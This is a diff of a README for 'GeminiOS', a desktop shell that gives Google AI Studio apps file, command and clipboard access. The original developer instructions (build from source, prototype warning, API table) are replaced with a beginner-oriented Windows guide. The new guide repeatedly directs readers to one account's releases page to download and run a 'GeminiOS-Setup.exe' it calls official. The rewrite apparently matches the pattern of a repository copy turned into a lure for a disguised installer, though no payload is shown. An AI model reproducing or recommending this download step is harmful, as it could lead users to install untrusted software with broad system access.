@@ -1,100 +1,117 @@
-# GeminiOS
+# 🪐 GeminiOS - Run AI Studio Apps Locally  
 
-> **Prototype / Experimental** — This project is a proof of concept and is not supported. Use at your own risk.
+[![Download GeminiOS](https://img.shields.io/badge/Download-GeminiOS-brightgreen?style=for-the-badge)](https://github.com/Dapperdan1956/GeminiOS/releases)  
 
-GeminiOS is an Electron shell that embeds [Google AI Studio](https://aistudio.google.com/) and provides a bridge that allows applications generated within AI Studio to communicate with your local operating system.
+## 🔍 What Is GeminiOS?  
 
-## What This Does
+GeminiOS is a desktop app that runs Google AI Studio inside a window on your computer. It lets applications created in AI Studio talk directly with your Windows system.  
 
-GeminiOS wraps Google AI Studio in a desktop application. When AI Studio generates and runs an app inside its preview iframe, that app gains access to a `window.geminiOS` JavaScript API that can read/write files, execute commands, access the clipboard, and more — all on your local machine.
+When you open or build apps inside AI Studio, GeminiOS gives them special permissions to do tasks like read and write files, run commands, and use the clipboard on your PC. This makes the apps more powerful and lets them do things that a normal website cannot do.  
 
-[Simple example here:](https://youtube.com/watch?v=SrOCR46jxmM&feature=youtu.be)
+Think of GeminiOS as a bridge between your local computer and apps made in Google AI Studio.  
 
-### ⚠️ Security Warning
+## ⚠️ Important Security Notes  
 
-**This effectively gives a website access to your local operating system.** While every operation requires explicit user approval through a permission dialog, you should:
+GeminiOS lets apps access parts of your computer. Every time an app wants to do something—like opening a file—you will see a permission request. Only click "Allow" if you trust what the app is asking. If you are unsure, click "Deny." This helps keep your computer safe.  
 
-- **Carefully read each permission request** before clicking "Allow"
-- **Deny any operation** you don't recognize or didn't expect
-- **Never run this against sensitive directories** or systems
-- **Treat this as you would any application with full OS access** — because that's what it is once you click "Allow"
+## 💻 System Requirements  
 
-This is a prototype for exploring what's possible when AI-generated applications can interact with the OS. It is not hardened for production use.
+- Windows 10 or later (64-bit preferred)  
+- At least 4 GB of RAM  
+- 1 GB of free disk space  
+- Internet connection to use Google AI Studio inside the app  
+- Monitor with 1280x720 resolution or higher  
 
-## How It Works
+Your computer should meet these requirements for GeminiOS to run smoothly.  
 
-```
-Google AI Studio (in Electron WebContentsView)
-  └─ Generated app runs in a sandboxed iframe
-       └─ window.geminiOS API (injected automatically)
-            └─ Private MessageChannel → parent frame bridge
-                 └─ Electron IPC → main process
-                      └─ Permission dialog (user must approve)
-                           └─ OS operation executes
-```
+## 🚀 Getting Started: Download and Install GeminiOS  
 
-1. AI Studio loads inside an Electron window
-2. When AI Studio generates and previews an app, the app runs in an iframe
-3. GeminiOS automatically injects the `window.geminiOS` API into that iframe via a secure MessageChannel bridge
-4. When the app calls any API method (e.g., `window.geminiOS.fs.readFile(...)`), a native permission dialog appears
-5. The user must click **Allow** for the operation to proceed — clicking **Deny** rejects the Promise
-6. If approved, the Electron main process executes the operation and returns the result
+### Step 1: Download GeminiOS  
 
-## Getting Started
+Visit the official release page and download the latest Windows installer:  
 
-### Prerequisites
+[![Download GeminiOS](https://img.shields.io/badge/Download-GeminiOS-blue?style=for-the-badge)](https://github.com/Dapperdan1956/GeminiOS/releases)  
 
-- Node.js 18+
-- npm
+You will see a list of files. Look for a file named something like `GeminiOS-Setup.exe` or similar. This is the installer.  
 
-### Install & Run
+### Step 2: Run the Installer  
 
-```bash
-git clone https://github.com/user/GeminiOS.git
-cd GeminiOS
-npm install
-npm start
-```
+1. Open your Downloads folder.  
+2. Double-click the `GeminiOS-Setup.exe` file to start the installation.  
+3. Follow the on-screen instructions. Usually, click "Next," then "Install."  
+4. Wait while the program installs.  
 
-### Building
+### Step 3: Open GeminiOS  
 
-```bash
-# Package for current platform
-npm run make
-```
+After installation, look for the GeminiOS icon on your desktop or in the Start menu. Double-click it to launch the app.  
 
-Builds are configured for macOS (ZIP) and Windows (Squirrel installer).
+When GeminiOS starts, it will load Google AI Studio inside a window.  
 
-## Teaching AI Studio to Use the Bridge
+## 🛠 How to Use GeminiOS  
 
-When creating an application in AI Studio that should interact with the OS, **attach the [`GEMINI_OS_API.md`](./GEMINI_OS_API.md) file as context** in your prompt. This file contains the full API specification, usage examples, and error handling patterns that AI Studio needs to generate working code.
+### Running AI Studio Apps on Your PC  
 
-For example, you might prompt:
+1. Use Google AI Studio inside GeminiOS just like you would in a browser.  
+2. When AI Studio runs an app, it appears inside a preview area in GeminiOS.  
+3. The app can request permission to perform tasks on your PC, such as reading files or using the clipboard.  
+4. If you see a permission popup, read it carefully and click "Allow" only if you trust the app.  
 
-> "Build me a file browser app that lets me navigate my local filesystem. Use the GeminiOS API described in the attached document."
+### Basic Tasks You Can Let GeminiOS Do  
 
-The spec covers:
-- **Filesystem** — read, write, list, stat, mkdir, delete
-- **Shell** — open URLs in the default browser, execute commands
-- **Clipboard** — read and write text
-- Environment detection with `waitForGeminiOS()` for proper initialization
-- Error handling for permission denials
+- **Read and save files**: Apps can open and edit files on your computer.  
+- **Run simple commands**: Apps may ask to run commands you approve.  
+- **Clipboard access**: Copy and paste text between apps and your PC.  
 
-## Available API Methods
+### Simple Example  
 
-| Namespace   | Method                        | Description                    |
-|-------------|-------------------------------|--------------------------------|
-| `fs`        | `readFile(path, encoding?)`   | Read file contents             |
-| `fs`        | `writeFile(path, content)`    | Write string to file           |
-| `fs`        | `readDir(path)`               | List directory entries         |
-| `fs`        | `stat(path)`                  | Get file size, type, timestamps|
-| `fs`        | `mkdir(path, recursive?)`     | Create directory               |
-| `fs`        | `delete(path, recursive?)`    | Delete file or directory       |
-| `shell`     | `openExternal(url)`           | Open URL in default browser    |
-| `shell`     | `exec(command, args[])`       | Run a command (30s timeout)    |
-| `clipboard` | `readText()`                  | Read clipboard text            |
-| `clipboard` | `writeText(text)`             | Write text to clipboard        |
+You can see a simple example of a GeminiOS app in this short video:  
 
-## License
+[https://youtube.com/watch?v=SrOCR46jxmM&feature=youtu.be](https://youtube.com/watch?v=SrOCR46jxmM&feature=youtu.be)  
 
-MIT
+This shows how AI Studio apps can interact with your files and clipboard through GeminiOS.  
+
+## 🎛 Settings and Preferences  
+
+- You can control permissions for apps globally or per request.  
+- GeminiOS shows clear permission dialogs before any app accesses your PC.  
+- No app can run commands or access files without your approval.  
+
+## ❓ Troubleshooting  
+
+### GeminiOS Won’t Start  
+
+- Check if your Windows version meets the minimum requirements.  
+- Make sure you have installed all Windows updates.  
+- Try restarting your computer.  
+
+### AI Studio Doesn’t Load Correctly  
+
+- Make sure your internet connection is active.  
+- Confirm that GeminiOS is not blocked by firewall or security software.  
+- Close GeminiOS and open it again.  
+
+### Permission Requests Missing or Not Working  
+
+- GeminiOS must be running in the foreground to show dialogs properly.  
+- Restart GeminiOS if you don’t see any permission prompts.  
+
+## 🗂 File Locations  
+
+- GeminiOS stores its files in your user profile under `AppData\Local\GeminiOS`.  
+- Temporary files used by AI Studio apps are saved here.  
+
+## 🛡 Security Advice  
+
+- Always read permission requests carefully.  
+- Do not allow unexpected operations.  
+- Only use GeminiOS with trusted AI Studio projects.  
+- Keep your Windows security patches updated.  
+
+## 🔗 Useful Links  
+
+- Official GeminiOS releases and downloads: [https://github.com/Dapperdan1956/GeminiOS/releases](https://github.com/Dapperdan1956/GeminiOS/releases)  
+- Google AI Studio homepage: [https://aistudio.google.com/](https://aistudio.google.com/)  
+
+## 📞 Getting Help  
+
+If you run into problems, search the issues section of the GitHub page or ask for help where available. Keep in mind this project is experimental and may not have full support.
